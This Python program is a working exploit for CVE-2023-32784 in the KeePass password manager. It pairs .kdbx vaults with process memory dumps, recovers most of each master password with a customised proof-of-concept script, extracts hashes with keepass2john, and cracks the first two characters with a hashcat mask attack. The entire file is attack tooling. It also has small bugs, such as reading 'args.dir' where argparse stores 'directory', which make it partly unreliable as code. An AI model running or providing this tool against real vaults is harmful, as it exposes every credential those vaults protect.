"""
EXPLOIT_KEEPASS is a Python program that exploits the security vulnerability CVE-2023-32784 in the password manager KeePass.
This exploit reconstructs the master password in plain text based on memory dumps (.DMP). 
Three programs are involved in the cracking process: a costumized version of keepass-dump-masterkey, keepass2john and hashcat.
"""

import argparse
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Dict, Optional
from dotenv import load_dotenv


# 1)
def process_directory(directory: str) -> Tuple[List[str], List[str]]:
    """
    Extracts .kdbx and .DMP files from a directory and saves them in a list.

    Args:
        directory (str): Path to the directory containing files.

    Returns:
        Tuple[List[str], List[str]]: Lists of .kdbx files and .DMP files.
    """
    kdbx_files = []
    dmp_files = []

    # looping trough all files in the directory
    for filename in os.listdir(directory):
        # checking, if file ends with .kdbx and append it in array if yes
        if filename.endswith(".kdbx"):
            kdbx_files.append(os.path.join(directory, filename))
        # checking, if file ends with .DMP and append it in array if yes
        elif filename.endswith(".DMP"):
            dmp_files.append(os.path.join(directory, filename))

    print('All kdbx-files and DMP-files listed.')
    return kdbx_files, dmp_files


# 2)
def map_dmp_to_kdbx(kdbx_files: List[str], dmp_files: List[str]) -> Dict[str, str]:
    """
    Maps .DMP files to corresponding .kdbx files.

    Args:
        kdbx_files (List[str]): List of .kdbx file paths.
        dmp_files (List[str]): List of .DMP file paths.

    Returns:
        Dict[str, str]: Mapping of .DMP files to corresponding .kdbx files.
    """
    mapped_files = {}

    for dmp_file in dmp_files:
        base_name = os.path.splitext(os.path.basename(dmp_file))[0]

        # searching corresponding .kdbx-file for DMP-file
        for kdbx_file in kdbx_files:
            if base_name in kdbx_file:
                mapped_files[dmp_file] = kdbx_file
                break
    
    print('Files successfully mapped.')
    return mapped_files


# 3.2)
def run_poc_script(dmp_file: str) -> Optional[Tuple[str, str]]:
    """
    Runs the customized poc script (keepass-dump-masterkey) to reconstruct the master password from single .DMP file.
    What has been changed compared to the original program?
     - Customized version: The first two characters of the master password are cut off.
     - Original: The first character is missing and the second is a guess.

    Args:
        dmp_file (str): Path to the .DMP file.

    Returns:
        Optional[Tuple[str, str]]: The .DMP file and the reconstructed password (missing first two characters).
    """
    list = subprocess.run(['python', 'my_poc.py', dmp_file], capture_output=True, text=True)
    
    if list.returncode == 0:
        output = list.stdout.strip()
        # seperating output list
        output_list = output.splitlines()
        if output_list:
            # extract last entry of the list because we only need one entry
            masterpassword_missing_first = output_list[-1]
            return dmp_file, masterpassword_missing_first
        else:
            print("The list is empty.")
            return None
    else:
        print(f"Error in execute my_poc.py for {dmp_file}: {list.stderr}")
        return None


# 3.1)
def extract_masterpasswords(dmp_files: List[str]) -> Dict[str, str]:
    """
    Extracts master passwords (excluding the first two characters) from given .DMP files.

    Args:
        dmp_files (List[str]): List of .DMP file paths.

    Returns:
        Dict[str, str]: Dictionary mapping .DMP files to partial master passwords.
    """
    partial_masterpasswords = {}

    # using ThreadPoolExecutor for concurrent execution
    with ThreadPoolExecutor() as executor:
        # loop through all .DMP files and call the customized POC script
        future_to_dmp = {executor.submit(run_poc_script, dmp_file): dmp_file for dmp_file in dmp_files}
        for future in as_completed(future_to_dmp):
            result = future.result()
            dmp_file, masterpassword_missing_first = result
            # saving password in dictionary
            if masterpassword_missing_first:
                partial_masterpasswords[dmp_file] = masterpassword_missing_first
                # print(f"Processed {dmp_file}: {masterpassword_missing_first}") # printing masterpassword without first two characters for .DMP-file

    print('Masterpassword-Extraction successful.')
    return partial_masterpasswords


# 4.2)
def extract_hash_from_kdbx(kdbx_file: str) -> Tuple[str, Optional[str]]:
    """
    Extracts a single hash from a single .kdbx file using `keepass2john`.

    Args:
        kdbx_file (str): Path to the .kdbx file.

    Returns:
        Tuple[str, Optional[str]]: The .kdbx file and its extracted hash, or None if extraction fails.
    """
    try:
        # running keepass2john to extract the hash
        result = subprocess.run(['keepass2john', kdbx_file], capture_output=True, text=True)

        if result.returncode == 0:
            # the output will be the hash for the .kdbx file
            kdbx_hash = result.stdout.strip()
            kdbx_hash = kdbx_hash.split(':', 1)[1].strip()
            return kdbx_file, kdbx_hash
        else:
            print(f"Error in executing keepass2john for {kdbx_file}: {result.stderr}")
            return kdbx_file, None
    except Exception as e:
        print(f"Exception occurred while processing {kdbx_file}: {e}")
        return kdbx_file, None


# 4.1)
def process_kdbx_files(kdbx_files: List[str]) -> Dict[str, Optional[str]]:
    """
    Extracts hashes from all .kdbx files concurrently.

    Args:
        kdbx_files (List[str]): List of .kdbx file paths.

    Returns:
        Dict[str, Optional[str]]: Dictionary mapping .kdbx files to their hashes.
    """
    kdbx_hashes = {}

    # using ThreadPoolExecutor to run hash extraction in parallel
    with ThreadPoolExecutor() as executor:
        future_to_kdbx = {executor.submit(extract_hash_from_kdbx, kdbx_file): kdbx_file for kdbx_file in kdbx_files}

        for future in as_completed(future_to_kdbx):
            kdbx_file, kdbx_hash = future.result()

            if kdbx_hash:
                # print(f"Extracted hash for {kdbx_file}: {kdbx_hash}")# printing hashes for the kdbx-file
                kdbx_hashes[kdbx_file] = kdbx_hash
            else:
                kdbx_hashes[kdbx_file] = None

    print("Hash extraction completed.")
    return kdbx_hashes


# 5)
def map_valid_masterpasswords(dmp_to_kdbx: Dict[str, str], partial_masterpasswords: Dict[str, str]) -> Dict[str, str]:
    """
    Links partial passwords with corresponding .kdbx files based on DMP-to-KDBX mapping.

    Args:
        dmp_to_kdbx (Dict[str, str]): Mapping of .DMP to .kdbx files.
        partial_masterpasswords (Dict[str, str]): Partial master passwords from .DMP files.

    Returns:
        Dict[str, str]: Mapping of .kdbx files to partial master passwords.
    """
    print('Dictionary that connects Hashes with their incomplete passwords is built.')
    return {
        dmp_to_kdbx[dmp_file]: masterpassword 
        for dmp_file, masterpassword in partial_masterpasswords.items() 
        if dmp_file in dmp_to_kdbx
    }


# 6)
def get_masterpassword(kdbx_hashes: Dict[str, Optional[str]], partial_masterpasswords: Dict[str, str]) -> Dict[str, str]:
    """
    Performs a brute-force Mask Attack with Hashcat to find the missing first two characters
    of the master password.

    Uses hashcat with attack mode -a 3 (?a?a + partial password).

    Args:
        kdbx_hashes (Dict[str, Optional[str]]): Mapping of .kdbx files to their hashes.
        partial_masterpasswords (Dict[str, str]): Partial master passwords.

    Returns:
        Dict[str, str]: Mapping of .kdbx files to fully reconstructed master passwords.
    """
    for kdbx_file, partial_password in partial_masterpasswords.items():
        kdbx_hash = kdbx_hashes.get(kdbx_file)

        if not kdbx_hash:
            print(f"[!] No hash found for {kdbx_file} . Skip...")
            continue

        # mask for hashcat mask attack
        mask = f"?a?a{partial_password}"

        print(f"[+] Start hashcat for {kdbx_file} with mask: {mask}")

        try:
            # run hashcat
            load_dotenv()
            HASHCAT_PATH = os.getenv("HASHCAT_PATH")
            subprocess.run([
                "hashcat", "-m", "13400", "-a", "3",
                kdbx_hash,
                mask,
                "--quiet", "--potfile-path", "cracked_passwords.potfile"
            ], cwd=HASHCAT_PATH)


        except Exception as e:
            print(f"[!] Error while running hashcat for {kdbx_file}: {e}")


def main() -> None:
    """
    Main function to orchestrate the cracking of KeePass master passwords using .kdbx and .DMP files.

    Steps:
        1. Extracts .kdbx and .DMP files from the specified directory.
        2. Maps .DMP files to corresponding .kdbx files.
        3. Extracts partial master passwords (missing first two characters) from .DMP files using a customized script of keepass-dump-masterkey.
        4. Extracts hashes from .kdbx files using the `keepass2john` tool.
        5. Links partial master passwords with .kdbx files based on their mapping.
        6. Performs a Mask Attack to reconstruct the full master passwords using the `hashcat` tool.

    Args:
        None (arguments are parsed directly from the command line).

    Returns:
        None (results are saved to a file and printed to the console).
    """
    parser = argparse.ArgumentParser(description="Crack KeePass Master Passwords using .kdbx and .DMP files.")
    parser.add_argument("--directory", "-dir", required=True, help="Directory containing .kdbx and .DMP file pairs")
    args = parser.parse_args()

    # path to directory that includes .kdbx and .DMP files
    directory = args.dir

    # 1) extracting .kdbx and DMP files
    kdbx_files, dmp_files = process_directory(directory)

    # 2) mapping .DMP files to corresponding .kdbx files
    dmp_to_kdbx_map = map_dmp_to_kdbx(kdbx_files, dmp_files)

    # 3) producing dictionary for masterpasswords without first two characters with programm: my_poc.py (customized keepass-dump-masterkey)
    partial_masterpasswords = extract_masterpasswords(dmp_files)

    # 4) extracting and saving hashes from .kdbx files with program: keepass2john
    kdbx_hashes = process_kdbx_files(kdbx_files)

    # 5) linking masterpasswords with corresponding .kdbx-files based on DMP-relation
    valid_masterpasswords = map_valid_masterpasswords(dmp_to_kdbx_map, partial_masterpasswords)

    # 6) cracking the masterpassword concurrently and save results as .potfile with program: hashcat
    get_masterpassword(kdbx_hashes, valid_masterpasswords)

    # 7) printing result
    print("Cracking completed. Results saved in cracked_passwords.potfile.")


if __name__ == "__main__":
    main()